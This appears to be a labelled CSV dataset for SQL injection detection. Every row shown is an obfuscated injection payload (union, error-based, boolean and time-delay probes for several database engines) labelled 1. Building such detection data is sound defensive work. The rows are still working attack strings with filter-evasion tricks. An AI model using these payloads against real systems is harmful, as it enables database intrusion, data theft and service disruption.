Query,Label
"-1000"" o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sele/**/ct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a/**/nd ""i/**/sbq""  =  ""i/**/sbq",1
"1'  )   an/**/d   (  s/**/elect 9067 f/**/rom  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x f/**/rom i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )   an/**/d   (  'qvrd'  =  'qvrd",1
"1%""   )    )     )   uni/**/on all sel/**/ect nul/**/l,nul/**/l,n/**/ull,n/**/ull,n/**/ull,n/**/ull,n/**/ull,nul/**/l,nul/**/l,nu/**/ll--",1
"1'   )    )     )    (  se/**/lect   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,nul/**/l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fro/**/m   (  value/**/s  (  0   )    )     )   a/**/nd    (    (     (  'nets' li/**/ke 'nets",1
"1"" wher/**/e 5517  =  5517 an/**/d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel/**/ect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1%""  )   an/**/d 9254  =    (  selec/**/t count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'   )    )    o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   a/**/nd    (    (   'kmjn'  =  'kmjn",1
1  )   wher/**/e 3671  =  3671,1
"1'   )    )    a/**/nd exp  (  ~  (  sel/**/ect * f/**/rom   (  se/**/lect concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    an/**/d    (    (   'kqqf'  =  'kqqf",1
1' rli/**/ke   (  sele/**/ct   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1
"1'   )    )     )   o/**/r 4411  =    (  se/**/lect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d    (    (     (  'narn'  =  'narn",1
"1',  (  selec/**/t   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  se/**/lect 3717 fro/**/m master..sysdatabas/**/es  )   end   )    )   ",1
"1  )   w/**/here 5234  =  5234 o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"selec/**/t * fr/**/om generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   li/**/mit 1--",1
"1"" wher/**/e 1140  =  1140 o/**/r 2367  =    (  selec/**/t count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1 u/**/nion all selec/**/t n/**/ull,n/**/ull,n/**/ull,nul/**/l,n/**/ull,n/**/ull,n/**/ull,nu/**/ll,n/**/ull,nul/**/l--",1
if  (  1665  =  3845  )   sel/**/ect 1665 else dr/**/op function nzod--,1
"1'   )    )    un/**/ion all sele/**/ct nu/**/ll,nu/**/ll,nul/**/l,n/**/ull,nul/**/l,nul/**/l,nul/**/l,n/**/ull#",1
"1 o/**/r 8421  =    (  se/**/lect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )   -- xgyc",1
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   a/**/nd '%'  =  '",1
"1  )   whe/**/re 9829  =  9829 o/**/r char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nul/**/l  )  --",1
"1%'  )   o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1%'   )    )    o/**/r 7417  =    (  se/**/lect count  (  *  )   fr/**/om sysibm.systa/**/bles as t1,sysibm.systabl/**/es as t2,sysibm.systa/**/bles as t3  )  --",1
"-3082""  )   w/**/here 1082  =  1082 o/**/r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-4104%' o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a/**/nd '%'  =  ',1
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   an/**/d    (    (   'bacm'  =  'bacm",1
se/**/lect   (  case when   (  8618  =  8706  )   then 8618 else 8618*  (  s/**/elect 8618 fr/**/om mysql.db  )   end  )  #,1
"-2605""  )   o/**/r 4493  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    a/**/nd   (  ""cikb"" lik/**/e ""cikb",1
1   )    )     )   o/**/r 4240  =    (  s/**/elect 4240 fro/**/m pg_sleep  (  5   )    )   --,1
"1'qhfy<'"">utwq",1
1  )   w/**/here 1120  =  1120,1
"1""  )   o/**/rde/**/r b/**/y 1#",1
"1%' o/**/r 6979  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
"s/**/elect count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 a/**/nd    (    (     (  ""dskh""  =  ""dskh",1
"1%""   )    )    a/**/nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sel/**/ect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    a/**/nd    (    (   ""%""  =  """,1
"1""   )    )    as wooq wh/**/ere 7671  =  7671 an/**/d row  (  6237,7469  )  >  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x f/**/rom   (  sele/**/ct 5192 un/**/ion se/**/lect 3785 uni/**/on s/**/elect 3931 unio/**/n se/**/lect 7158  )  a group b/**/y x  )  --",1
1   )    )    as wwkw w/**/here 7289  =  7289 an/**/d 7533  =  7533--,1
"1' o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1"" wh/**/ere 4450  =  4450 o/**/r 6979  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
"1%'   )    )    o/**/r   (  sel/**/ect 9173 f/**/rom  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x f/**/rom i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )   an/**/d    (    (   '%'  =  '",1
1' wher/**/e 5778  =  5778,1
-8860  )   o/**/r 4144  =    (  s/**/elect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   f/**/rom dual  ) ,1
"-1874""  )   as wgpj w/**/here 6481  =  6481 o/**/r 3629  =  3459",1
"1'  )   a/**/nd 8407  =    (  se/**/lect count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )    an/**/d   (  'lwrk' lik/**/e 'lwrk",1
"1%"" rli/**/ke   (  se/**/lect   (  case when   (  5135  =  9839  )   then 1 else 0x28 end   )    )    a/**/nd ""%""  =  """,1
"se/**/lect count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an/**/d   (  9481  =  9481",1
"1' i/**/n boolean mode  )   an/**/d 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  #",1
-3185'   )    )    o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s/**/elect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a/**/nd    (    (   'rknd' lik/**/e 'rknd,1
"1""  )   o/**/r   (  sel/**/ect 9173 f/**/rom  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )   an/**/d   (  ""njdu"" lik/**/e ""njdu",1
1%'   )    )     )   a/**/nd 2444  =  9282#,1
"-3975'  )   o/**/r make_s/**/et  (  1943  =  3499,3499  )   an/**/d   (  'dawb'  =  'dawb",1
"-8021""  )   unio/**/n all selec/**/t 1166,1166,1166,1166--",1
1'||  (  s/**/elect 'rjun' whe/**/re 8868  =  8868 an/**/d 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selec/**/t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1
"1   )    )    as zkrr wh/**/ere 4730  =  4730 o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1%""   )    )     )   o/**/r 2367  =    (  s/**/elect count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1   )    )     )   a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   an/**/d    (    (     (  6578  =  6578",1
1' wher/**/e 2661  =  2661,1
"-4686""  )   as dxks wh/**/ere 7123  =  7123 o/**/r elt  (  1032  =  1032,3623  )  --",1
"1"" o/**/r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nul/**/l  )   an/**/d ""dtwv"" lik/**/e ""dtwv",1
"1""  )   as aifd w/**/here 5962  =  5962",1
"1'   )    )     )   a/**/nd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nul/**/l  )   a/**/nd    (    (     (  'sjxp' li/**/ke 'sjxp",1
"-9487   )    )    as rvck wh/**/ere 9404  =  9404 o/**/r make_s/**/et  (  8921  =  6045,6045  )  --",1
"1'  )   as eany w/**/here 3169  =  3169 an/**/d 6414  =    (  selec/**/t count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'   )    )     )   waitfo/**/r delay '0:0:5' an/**/d    (    (     (  'wvzb'  =  'wvzb,1
"waitfo/**/r delay '0:0:5' an/**/d   (  ""dmcu""  =  ""dmcu",1
 (  se/**/lect   (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sel/**/ect   (  case when   (  3287  =  3287  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"1   )    )     )   a/**/nd upda/**/texml  (  3393,concat  (  0x2e,0x7171706a71,  (  sel/**/ect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   a/**/nd    (    (     (  5199  =  5199",1
-3648' w/**/here 4629  =  4629 o/**/r/**/der b/**/y 1--,1
"1'  )   as irsh wh/**/ere 4973  =  4973 o/**/r 7552  =    (  selec/**/t count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1%' an/**/d 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   an/**/d '%'  =  '",1
1  )   as mpnj whe/**/re 5049  =  5049,1
1'  )   as hqaq wher/**/e 6411  =  6411 an/**/d 8594  =    (  sele/**/ct 8594 fro/**/m pg_sleep  (  5   )    )   --,1
"1'  )   an/**/d up/**/datexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sel/**/ect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
"-9031%""  )   o/**/r/**/der b/**/y 1--",1
"1  )   as jqbv wher/**/e 8172  =  8172 a/**/nd 8148  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   --",1
"iif  (  9134  =  5736,1,1/0  )  ",1
1' an/**/d 2006  =  2006,1
"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s/**/elect 1 fr/**/om generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   l/**/imit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
"1' o/**/r 9643  =    (  se/**/lect count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.t/**/ables as t3  )   an/**/d 'mvkg'  =  'mvkg",1
"-1525'   )    )     )   unio/**/n all s/**/elect 4110,4110,4110,4110,4110,4110#",1
"1'  )   o/**/r 4915  =    (  sel/**/ect count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )  --",1
"1%'   )    )     )   an/**/d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    a/**/nd    (    (     (  '%'  =  '",1
"1""  )   w/**/here 3321  =  3321",1
1'+  (  selec/**/t nsri whe/**/re 1202  =  1202 a/**/nd 4595  =  4595#,1
"1'+  (  sele/**/ct xlvq w/**/here 7470  =  7470 an/**/d 3707  =    (  selec/**/t count  (  *  )   fro/**/m sysibm.systab/**/les as t1,sysibm.systa/**/bles as t2,sysibm.systa/**/bles as t3   )    )   +'",1
"-1204'   )    )    u/**/nion all se/**/lect 3585,3585--",1
1  )   wher/**/e 4711  =  4711,1
"-7491""  )   as cnrn wh/**/ere 3635  =  3635 o/**/r/**/der b/**/y 1#",1
"-8007' wh/**/ere 9649  =  9649 un/**/ion all selec/**/t 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1
"1  )   an/**/d 3707  =    (  se/**/lect count  (  *  )   fro/**/m sysibm.systabl/**/es as t1,sysibm.systab/**/les as t2,sysibm.syst/**/ables as t3  )  ",1
"-2190'  )   whe/**/re 8890  =  8890 unio/**/n all sel/**/ect 8890,8890#",1
1'   )    )    a/**/nd   (  3020  =  3020  )  *6703 a/**/nd    (    (   'vvkd' lik/**/e 'vvkd,1
-4262%'   )    )     )   o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel/**/ect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd    (    (     (  '%'  =  ',1
"-1043""  )   whe/**/re 4207  =  4207 o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1   )    )     )   an/**/d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd    (    (     (  6395  =  6395",1
"iif  (  1305  =  5656,1,1/0  )  ",1
"1'  )   a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   an/**/d   (  'ydxb'  =  'ydxb",1
"-9462""  )   as vzga w/**/here 4799  =  4799 o/**/r 8691  =  1048",1
"-6236'   )    )     )   o/**/r 1 group b/**/y concat  (  0x7171706a71,  (  selec/**/t   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )    havi/**/ng mi/**/n  (  0  )  #",1
"1   )    )     )   unio/**/n all sel/**/ect nul/**/l,nu/**/ll,nul/**/l,nul/**/l#",1
1'||  (  sel/**/ect 'bhxx' w/**/here 2585  =  2585,1
"-4236'  )   u/**/nion all sele/**/ct 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",1
"1' u/**/nion all sele/**/ct nu/**/ll,nul/**/l,nul/**/l,n/**/ull,nul/**/l,n/**/ull,nul/**/l,nu/**/ll,nul/**/l#",1
-4219' o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"-6778  )   as xutm whe/**/re 6442  =  6442 u/**/nion all selec/**/t 6442,6442,6442,6442,6442,6442#",1
"1"" w/**/here 9919  =  9919",1
"-9209%""   )    )     )   uni/**/on all se/**/lect 3736,3736,3736--",1
"1'  )   w/**/here 4750  =  4750 an/**/d exp  (  ~  (  sele/**/ct * fro/**/m   (  sel/**/ect concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
1'  )   as kqbh wh/**/ere 6138  =  6138,1
"1"" wher/**/e 4064  =  4064 an/**/d 4241  =  convert  (  i/**/nt,  (  se/**/lect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1"" wher/**/e 5098  =  5098 a/**/nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
"1%'  )   an/**/d make_se/**/t  (  8403  =  8403,8899  )   an/**/d   (  '%'  =  '",1
"1 o/**/r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
-4979'   )    )    o/**/r 4493  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    an/**/d    (    (   'ofgg'  =  'ofgg,1
"-8477' un/**/ion all s/**/elect 2517,2517,2517--",1
"1""   )    )    o/**/r 6979  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   --",1
"1"" wher/**/e 4319  =  4319",1
1' wh/**/ere 9024  =  9024 rli/**/ke   (  sele/**/ct * fro/**/m   (  sel/**/ect  (  sleep  (  5   )    )     )  sgvo  )  --,1
"1'  )   as ljpy wh/**/ere 8270  =  8270 o/**/r   (  sel/**/ect 9173 fr/**/om  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fro/**/m i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )  --",1
"1'   )    )    o/**/r 7552  =    (  sel/**/ect count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   a/**/nd    (    (   'uwrm'  =  'uwrm",1
"1'   )    )    a/**/nd 8514  =    (  sele/**/ct count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.t/**/ables as t3  )   a/**/nd    (    (   'ican' li/**/ke 'ican",1
1'  )   as mara w/**/here 7164  =  7164,1
-8359  )   w/**/here 4430  =  4430 o/**/r 6872  =  6872--,1
"1'   )    )    as ovbz wh/**/ere 3203  =  3203   (  sel/**/ect   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,nul/**/l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   f/**/rom   (  valu/**/es  (  0   )    )     )  --",1
"1'||  (  sel/**/ect 'ctgs' whe/**/re 6809  =  6809 o/**/r 6979  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
"1""   )    )    as sqzh wh/**/ere 5672  =  5672 an/**/d 5556  =    (  selec/**/t count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1  )   a/**/nd   (  7557  =  1711  )  *1711 an/**/d   (  5157  =  5157,1
"-1999  )   u/**/nion all sel/**/ect 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",1
s/**/elect   (  case when   (  6859  =  6507  )   then 6859 else 6859*  (  sele/**/ct 6859 fr/**/om mysql.db  )   end  )  #,1
"sel/**/ect * f/**/rom generate_series  (  7724,7724,case when   (  7724  =  8170  )   then 1 else 0 end  )   l/**/imit 1--",1
